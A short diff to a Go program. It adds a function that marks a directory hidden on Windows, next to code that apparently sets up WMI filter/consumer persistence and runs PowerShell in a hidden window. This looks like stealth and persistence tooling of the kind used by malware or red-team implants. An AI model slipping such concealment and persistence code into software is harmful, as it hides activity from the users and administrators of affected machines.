@@ -167,6 +167,18 @@ func deriveWMINames(targetPath string) (filterName, consumerName string) {
 	return prefix + "f" + suffix, prefix + "c" + suffix
 }
 
+func tryHideDirectory(dir string) {
+	ptr, err := syscall.UTF16PtrFromString(dir)
+	if err != nil {
+		return
+	}
+	attrs, err := syscall.GetFileAttributes(ptr)
+	if err != nil {
+		return
+	}
+	_ = syscall.SetFileAttributes(ptr, attrs|syscall.FILE_ATTRIBUTE_HIDDEN)
+}
+
 func runPowerShell(script string) error {
 	cmd := exec.Command("powershell.exe",
 		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
